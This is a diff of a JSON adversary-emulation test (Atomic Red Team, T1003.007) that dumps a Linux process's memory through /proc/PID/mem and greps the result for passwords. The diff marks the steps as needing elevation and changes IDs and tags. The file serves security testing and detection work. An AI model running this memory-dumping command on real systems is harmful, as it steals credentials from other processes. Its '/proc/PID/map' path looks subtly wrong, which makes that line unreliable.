@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "759c2ed5-fef8-46b3-95b3-aa0961435b73",
+      "id": "0c0df7e5-3892-446c-bd99-ab6fe4478474",
       "type": "execute-command",
       "data": {
         "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"#{output_file}\" | grep -i PASS\n",
         "command_type": "sh"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "1e0163c7-a39f-48f8-a0a9-344e3b2a8030",
+      "id": "55d965cc-6d2d-4309-b955-99f97ecf3a58",
       "type": "execute-command",
       "data": {
         "command": "rm -f \"#{output_file}\"\n",
         "command_type": "sh"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "3f25b2fe-94cd-4395-80d7-43c71a65c0f3",
+      "id": "9aee8a05-81fe-4f2e-af14-754504bd8b01",
       "name": "Check dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "dba7ec26-a885-464a-ac59-bed2b8ce201a",
+      "id": "7bc8df65-a35a-418b-9304-25df7b58bc97",
       "name": "Resolve dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "echo '#!/bin/sh' \u003e #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" \u0026\u0026 sleep 30' \u0026\" \u003e\u003e #{script_path}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "eb20fe2e-32ef-4d5a-8d6d-23bcfc31e9a9",
+      "id": "e525dcdb-f00b-4130-83b5-466f9553f9e9",
       "name": "Re-check dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "759c2ed5-fef8-46b3-95b3-aa0961435b73",
+      "s": "0c0df7e5-3892-446c-bd99-ab6fe4478474",
       "p": "on-success",
-      "o": "1e0163c7-a39f-48f8-a0a9-344e3b2a8030"
+      "o": "55d965cc-6d2d-4309-b955-99f97ecf3a58"
     },
     {
-      "s": "759c2ed5-fef8-46b3-95b3-aa0961435b73",
+      "s": "0c0df7e5-3892-446c-bd99-ab6fe4478474",
       "p": "on-failure",
-      "o": "1e0163c7-a39f-48f8-a0a9-344e3b2a8030"
+      "o": "55d965cc-6d2d-4309-b955-99f97ecf3a58"
     },
     {
-      "s": "3f25b2fe-94cd-4395-80d7-43c71a65c0f3",
+      "s": "9aee8a05-81fe-4f2e-af14-754504bd8b01",
       "p": "on-success",
-      "o": "759c2ed5-fef8-46b3-95b3-aa0961435b73"
+      "o": "0c0df7e5-3892-446c-bd99-ab6fe4478474"
     },
     {
-      "s": "3f25b2fe-94cd-4395-80d7-43c71a65c0f3",
+      "s": "9aee8a05-81fe-4f2e-af14-754504bd8b01",
       "p": "on-failure",
-      "o": "dba7ec26-a885-464a-ac59-bed2b8ce201a"
+      "o": "7bc8df65-a35a-418b-9304-25df7b58bc97"
     },
     {
-      "s": "dba7ec26-a885-464a-ac59-bed2b8ce201a",
+      "s": "7bc8df65-a35a-418b-9304-25df7b58bc97",
       "p": "on-success",
-      "o": "eb20fe2e-32ef-4d5a-8d6d-23bcfc31e9a9"
+      "o": "e525dcdb-f00b-4130-83b5-466f9553f9e9"
     },
     {
-      "s": "eb20fe2e-32ef-4d5a-8d6d-23bcfc31e9a9",
+      "s": "e525dcdb-f00b-4130-83b5-466f9553f9e9",
       "p": "on-failure",
-      "o": "759c2ed5-fef8-46b3-95b3-aa0961435b73"
+      "o": "0c0df7e5-3892-446c-bd99-ab6fe4478474"
     }
   ],
   "tags": [
-    "T1003.007",
-    "atomic-red-team"
+    "T1003",
+    "T1003.007"
   ],
   "input_arguments": [
     {
